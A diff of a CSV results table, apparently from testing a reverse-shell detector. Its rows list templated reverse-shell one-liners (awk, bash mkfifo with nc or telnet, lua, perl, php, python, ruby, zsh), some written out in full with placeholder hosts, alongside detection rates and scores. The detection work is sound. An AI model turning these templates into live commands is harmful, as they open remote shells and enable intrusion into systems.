@@ -1,12 +1,12 @@
 template_id,template,primary_binary,technique_family,network_primitives,num_samples,tpr,mean_score
-0,"awk 'BEGIN {VARIABLE_NAME_1 = ""/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER""; while(FD_NUMBER) { do{...",awk,scripting,/inet/,924,1.0,0.9408
+0,"awk 'BEGIN {VARIABLE_NAME_1 = ""/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER""; while(FD_NUMBER) { do{...",awk,scripting,/inet/,924,1.0,0.944
 6,VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME |...,bash,named_pipe,mkfifo,924,1.0,0.9996
-5,rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PAT...,bash,named_pipe,mkfifo,924,0.8312,0.8483
-2,"echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system(""nc -e NIX_SHELL IP_ADDRESS PORT_NUMBE...",bash,shell,,924,0.8106,0.8486
-4,rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH,bash,named_pipe,mkfifo,924,0.803,0.8208
-1,"lua -e ""require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER...",lua,scripting,socket.tcp,924,1.0,0.9999
+2,"echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system(""nc -e NIX_SHELL IP_ADDRESS PORT_NUMBE...",bash,shell,,924,0.8377,0.8636
+4,rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH,bash,named_pipe,mkfifo,924,0.8149,0.8349
+5,rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PAT...,bash,named_pipe,mkfifo,924,0.8095,0.8273
+1,"lua -e ""require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER...",lua,scripting,socket.tcp,924,1.0,1.0
 8,"perl -e 'use Socket;$VARIABLE_NAME_1=""IP_ADDRESS"";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK...",perl,scripting,"use Socket, sockaddr_in",924,1.0,1.0
 10,"php -r '$VARIABLE_NAME=fsockopen(""IP_ADDRESS"",PORT_NUMBER);popen(""NIX_SHELL <&FD_NUMBER >&FD_NUMBER ...",php,scripting,"fsockopen, popen",924,1.0,1.0
 9,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect...",python3,scripting,"socket.socket, pty.spawn, os.dup2",924,1.0,0.9998
 7,"ruby -rsocket -e'spawn(""NIX_SHELL"",[:in,:out,:err]=>TCPSocket.new(""IP_ADDRESS"",PORT_NUMBER))'",ruby,scripting,"TCPSocket, spawn",924,1.0,0.9999
-3,zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY',zsh,scripting,ztcp,924,1.0,0.7857
+3,zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY',zsh,scripting,ztcp,924,1.0,0.6632
